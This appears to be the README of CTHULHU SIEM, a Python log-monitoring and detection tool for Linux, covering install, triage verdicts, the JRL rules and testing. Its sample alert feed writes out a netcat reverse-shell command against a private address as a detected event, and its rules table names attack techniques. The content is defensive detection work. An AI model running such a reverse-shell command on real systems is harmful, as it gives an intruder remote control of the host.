![CTHULHU SIEM](https://r2.jts.gg/cth_img.png)

# CTHULHU SIEM

A small, fast, **dependency-free** SIEM for Linux hosts. Pure Python standard
library — no agents, no external services, no pip install.

It tails `auditd` and `systemd-journald` (and any log file you point it at),
normalizes events into one schema, evaluates them against rules written in
**JRL**, and gives you a console for triaging what comes out.

```
  ^(;,;)^  CTHULHU SIEM v2.0   ·  live feed

  ● 10:14:02 CRIT 53ZTK5Z7  reverse_shell_netcat        nc -e /bin/bash 10.0.0.5 4444 (uid=1000)
  ● 10:14:07 HIGH RB9QX0AG  exec_from_volatile_dir      /tmp/.x/payload (uid=1000)
  ● 10:14:11 CRIT TA89GGF0  privileged_container_started docker run --privileged alpine
  ● 10:14:19 HIGH PH6PF36B  ssh_brute_force             ssh failure for 'root' from 203.0.113.9
```

---

## What each file is

Three kinds of config, in three languages.

| File | Language | Read by | Purpose |
|------|----------|---------|---------|
| **`alerts.jrl`** | JRL | CTHULHU | All 135 detections, in one file. This is where you write rules. |
| `auditd/50-cthulhu.rules` | auditd syntax | the kernel, via auditd | What auditd logs. Without it auditd emits almost nothing and the auditd-backed rules have no events to match. Installs to `/etc/audit/rules.d/`. |
| `feeds.d/*.json` | JSON | CTHULHU | How to read a log format CTHULHU does not know natively — nginx, Kubernetes audit, an appliance's syslog. Optional; auditd and journald need none. |

The flow, end to end:

```
auditd/50-cthulhu.rules  ──►  what the kernel logs
feeds.d/nginx.json       ──►  how to parse an unfamiliar log
                                        │
                                        ▼
                              alerts.jrl  ──►  what counts as an alert
```

The `.example` files in `feeds.d/` are inert templates. Nothing loads them
until you drop the `.example` suffix, so a fresh install runs on auditd and
journald alone.

---

## Install

```bash
git clone https://github.com/jtsteinbach/cthulhu.git
cd cthulhu
sudo bash setup.sh
```

The installer verifies Python 3.10+, installs auditd if missing, deploys the
audit policy (`auditd/50-cthulhu.rules`), writes a hardened systemd unit,
validates the ruleset, and starts the engine.

Re-running it is safe. Alerts, verdicts and a locally edited ruleset are
preserved — an edited `alerts.jrl` is backed up and the new baseline is left
alongside as `alerts.jrl.new` for you to merge.

```bash
sudo bash setup.sh --no-audit     # skip the auditd policy
```

Requirements: Linux with systemd, Python 3.10+, root (to read `audit.log`).

### Upgrading an existing install

Re-running `setup.sh` upgrades in place. Any modules from an earlier layout
are moved aside into `/cthulhu/backup-<timestamp>/` rather than left on
`PYTHONPATH`, where they could shadow the current package. Your
`alerts.jsonl` and `triage.jsonl` are preserved untouched.

### Removing

```bash
sudo bash uninstall.sh              # remove CTHULHU, keep alerts and rules
sudo bash uninstall.sh --purge      # remove everything, including data
sudo bash uninstall.sh --dry-run    # show what would happen, change nothing
sudo bash uninstall.sh --keep-audit # leave the auditd policy loaded
```

Without `--purge`, `alerts.jsonl`, `triage.jsonl` and `alerts.jrl` are
left in place.

---

## Use

```bash
cth                                  # interactive console
                                     #   1 alert feed   2 triage   3 all alerts
                                     #   4 statistics   5 rules    6 data feeds
cth live                             # stream open alerts as they arrive
cth live -s high                     # only high and critical
cth live --all                       # include alerts that already have a verdict

cth list --status open               # everything awaiting a verdict
cth list -s critical -n 20
cth list -r reverse_shell            # filter by rule
cth list -t persistence              # filter by tag

cth stats                            # volume, verdicts, rule precision
cth rules                            # loaded detections
cth feeds                            # configured data sources
cth check                            # validate the ruleset
```

### Triage

Every alert carries a verdict. The distinction that matters most is between
a rule that is *wrong* and a rule that is *right about something authorized*:

```bash
cth triage 53ZTK5Z7                                     # review, then be prompted
cth triage 53ZTK5Z7 tp -m "confirmed — host isolated"   # true positive
cth triage RB9QX0AG bp -m "our build agent"             # benign positive
cth triage PH6PF36B fp -m "rule too broad"              # false positive
cth triage RB9QX0AG bp --similar                        # every alert with this signature
cth triage RB9QX0AG bp --rule-wide                      # every untriaged alert from this rule
```

`cth triage <id>` with no verdict is the review screen: it prints the full
alert — process, identity, file, network, log context, and the conditions
that matched — then asks for a verdict. Leave the prompt blank to walk away
without deciding.

| Verdict | Meaning | What to do |
|---------|---------|------------|
| `tp` true positive | Real, unwanted activity | Respond |
| `bp` benign positive | Detection correct, activity authorized | Suppress the actor, keep the rule |
| `fp` false positive | Rule matched the wrong thing | Narrow the rule |
| `wip` in progress | Being investigated | — |
| `dup` duplicate | Same activity as another alert | — |

Marking an alert prints a **concrete JRL edit** that would prevent it
recurring — an exclusion for a false positive, a throttle or actor-level
suppression for a benign one:

```
── SUGGESTED TUNING ──────────────────────── edit /cthulhu/alerts.jrl

  # exec_from_volatile_dir matched activity it was not meant to describe.
  # Narrow it by adding one of these conditions:
      : exe not in ["/tmp/build/stage.sh"]

  # Better still, promote the exclusion to a shared list so
  # every rule benefits:
      @list known_good = ["/tmp/build/stage.sh"]
      : exe not in $known_good
```

`cth stats` then ranks rules by precision, lowest first, so tuning effort
goes where it pays:

```
RULE                    FIRED  TRUE  BENIGN  FALSE  PRECISION
exec_from_volatile_dir     48     0       2     31         6%
ssh_brute_force            12    11       0      0       100%
```

### Signatures — decide once, not every time

Every alert carries a **signature**: a fingerprint of the activity behind it,
built from the fields that describe *what happened* (executable, command,
path, user, address, unit) plus the rule that fired.

Instance-specific noise is folded out before hashing, so the same activity
keeps the same signature across occurrences:

```
/tmp/build-448271/deploy.sh   ┐
/tmp/build-991823/deploy.sh   ├─►  same signature
/proc/8813/environ            ┘
```

Identities and addresses are compared **exactly**. `203.0.113.9` and
`198.51.100.7` never share a signature, so clearing one source can never
silently clear another.

When you record a verdict, the signature is indexed against it. From then on
the same activity is recognized rather than re-queued:

```
STATUS
open          ← never seen before, needs review
false-pos     ← you decided this one
↺ false-pos   ← same activity as something you already closed
```

Recognized alerts are still written to `alerts.jsonl` — nothing is thrown
away — but they carry a `prior_verdict` field and drop out of both the alert
feed and `cth list --status open`, so the queue only shows genuinely new
things. `cth live --all` shows everything when you want the full stream. The engine loads closed signatures at startup and refreshes them on
`systemctl reload`.

If a rule is noisy enough that you want recognized repeats gone entirely:

```bash
CTHULHU_SUPPRESS_KNOWN=true      # drop repeats of closed FALSE positives
```

This only ever drops false positives. Benign and true positives are always
written, because authorized activity turning malicious is exactly what you
need to keep seeing.

Verdicts live in `/cthulhu/triage.jsonl`, an append-only journal that keeps
full history of who changed what and when.

---

## Rules

135 baseline rules ship in `/cthulhu/alerts.jrl`, mapped to MITRE ATT&CK and
tuned to stay quiet during normal administration. Coverage:

| Area | Examples |
|------|----------|
| Execution | reverse shells (netcat, `/dev/tcp`, interpreter, socat), fileless `memfd` execution, webshell-spawned shells, download-and-execute |
| Persistence | `authorized_keys`, cron, systemd units and timers, PAM, `ld.so.preload`, udev, shell profiles, new accounts |
| Privilege escalation | setuid creation, GTFOBins escapes, pkexec abuse, capability grants, kernel exploit markers, ptrace injection |
| Defense evasion | auditd tampering, log and history destruction, timestomping, `chattr`, firewall flush, MAC disable, rootkit modules, eBPF |
| Credential access | shadow reads, SSH keys, cloud credentials, IMDS queries, process memory dumping, keyloggers |
| Discovery | network scanners, packet capture, recon bursts, setuid enumeration, credential searches |
| Lateral movement & C2 | outbound SSH, tunnelling tools, port forwarding, suspicious egress |
| Exfiltration | sensitive-path archiving, uploads, DNS tunnelling |
| Impact | cryptominers, ransomware indicators, backup destruction, wipes, mass service stops |
| Containers | Docker socket access, privileged containers, host mounts, namespace escape |
| Integrity | audit backlog loss, OOM, filesystem errors, crash loops, AVC/seccomp denials |

Tuning happens in one place — the `@list` block at the top of the file:

```text
@list trusted_automation = [
    "apt", "dpkg", "unattended-upgr", "ansible-playbook", "puppet", ...
]
```

Add your config-management agent there and every rule stops flagging it.
See **[JRL_GUIDE.md](JRL_GUIDE.md)** for the full language.

---

## Adding a data source

Drop a JSON descriptor in `/cthulhu/feeds.d/` — no Python required. Named
regex groups become rule fields automatically.

```json
{
  "name": "nginx",
  "paths": ["/var/log/nginx/access.log"],
  "format": "regex",
  "category": "web",
  "pattern": "^(?P<remote_ip>\\S+) .* \"(?P<http_method>[A-Z]+) (?P<http_path>[^ ]*)[^\"]*\" (?P<http_status>\\d{3})",
  "types": { "http_status": "int" }
}
```

```text
web_path_traversal(high)
    | "Path traversal attempt against the web server"
    ~ on: nginx
    ~ threshold: 3 in 60s by remote_ip
    : http_path contains ["../", "..%2f"]
```

Both `regex` and `json` line formats are supported. Examples in `feeds.d/`.

---

## Configuration

Every path and behaviour is settable from the environment (`CTHULHU_*`), and
the systemd unit is the natural place to set them:

| Variable | Default | Purpose |
|----------|---------|---------|
| `CTHULHU_ROOT` | `/cthulhu` | base directory |
| `CTHULHU_RULES` | `$ROOT/alerts.jrl` | ruleset |
| `CTHULHU_ALERT_LOG` | `$ROOT/alerts.jsonl` | alert output |
| `CTHULHU_TRIAGE_LOG` | `$ROOT/triage.jsonl` | verdict journal |
| `CTHULHU_FEEDS_DIR` | `$ROOT/feeds.d` | feed descriptors |
| `CTHULHU_AUDIT_LOG` | `/var/log/audit/audit.log` | auditd source |
| `CTHULHU_MIN_SEVERITY` | `info` | drop alerts below this |
| `CTHULHU_SUPPRESS_KNOWN` | `false` | drop repeats of activity closed as a false positive |
| `CTHULHU_DISABLE_FEEDS` | — | comma-separated feed names |
| `CTHULHU_MAX_ALERT_BYTES` | `67108864` | rotate the alert log at this size |
| `NO_COLOR` | — | disable colour output |

Alerts are JSONL, one object per line, with ISO-8601 UTC timestamps — pipe
them straight into anything:

```bash
tail -f /cthulhu/alerts.jsonl | jq 'select(.severity=="critical")'
cth export -s high -o incident.json
```

---

## Operating

```bash
systemctl status cthulhu
systemctl reload cthulhu        # reload rules, no downtime, no dropped events
journalctl -u cthulhu -f
auditctl -s                     # watch `lost` — if it climbs, raise -b in the audit policy
```

The engine handles log rotation, restarts failed collectors with backoff,
reloads rules on `SIGHUP`, and shuts down cleanly on `SIGTERM`.

---

## Testing that detection actually works

A live smoke test generates deliberately harmless activity the ruleset is
written to catch, then shows what came out:

```bash
bash tests/trigger_alerts.sh --list     # show what it would run
sudo bash tests/trigger_alerts.sh       # run it
bash tests/trigger_alerts.sh --clean    # remove the scratch files
```

It checks the things that actually break first — audit policy loaded,
service running, and whether your shell has a login uid at all (the execve
audit rules filter on `auid>=1000`, so a shell without one captures nothing)
— and tells you which is wrong rather than just reporting no alerts.

Expect around a dozen alerts from ten triggers, including
`reverse_shell_bash_devtcp`, `cryptominer_execution`, `shadow_file_read`,
`setuid_binary_enumeration` and `timestomping`.

Nothing it runs is dangerous. No connection leaves the host, nothing is
mined, no payload is fetched, and no file outside `/tmp/cthulhu-smoketest`
is touched. The triggers work because the rules match on *command shape* —
which is what makes them detections rather than signatures of specific
binaries.

Triage the results as false positives when you are done, or they will sit in
the open queue.

---

## Validating changes

A self-contained suite ships in `tests/` — standard library only, no test
framework, non-zero exit on failure:

```bash
python3 tests/run_tests.py               # all 169 checks
python3 tests/run_tests.py detection     # one group
python3 tests/run_tests.py -v            # show every case
```

| Group | Covers |
|-------|--------|
| `language` | JRL parsing, operators, null semantics, error handling |
| `normalize` | auditd/journald → canonical schema |
| `ruleset` | the shipped `alerts.jrl` parses and validates cleanly |
| `detection` | 35 known attacks each produce their expected alert |
| `falsepositive` | 15 benign administration scenarios stay quiet |
| `feeds` | descriptor feeds register, parse and validate |
| `triage` | verdicts persist, revise, and drive tuning suggestions |
| `signature` | activity fingerprints and recurrence recognition |
| `suppression` | threshold and throttle windows behave |
| `engine` | live tailing survives rotation and truncation |

Run it after editing `alerts.jrl`. The detection and false-positive groups
are the ones that catch a rule edit going wrong — if you add an exclusion
that is too broad, a detection check fails immediately.

---

## Architecture

```
  auditd ──┐
 journald ─┼──► normalize ──► JRL engine ──► suppress ──► alerts.jsonl ──► cth
  feeds.d ─┘   (one schema)   (135 rules)   (throttle,                     (triage)
                                             threshold)                       │
                                                                              ▼
                                                                       triage.jsonl
```

| Module | Role |
|--------|------|
| `schema.py` | canonical field definitions shared by ingest, rules and UI |
| `feeds.py` | pluggable data sources; built-in and descriptor-driven |
| `normalize.py` | auditd/journald parsing, enrichment, `cmdline` reconstruction |
| `jrl.py` | tokenizer, parser, compiled evaluator (no `eval`) |
| `alerts.py` | alert construction, throttling, correlation, rotation |
| `triage.py` | verdict journal and tuning suggestions |
| `engine.py` | daemon, tailing, supervision, signals |
| `ui.py` | terminal rendering primitives |
| `cli.py` | console and subcommands |

---

## License

https://r2.jts.gg/license
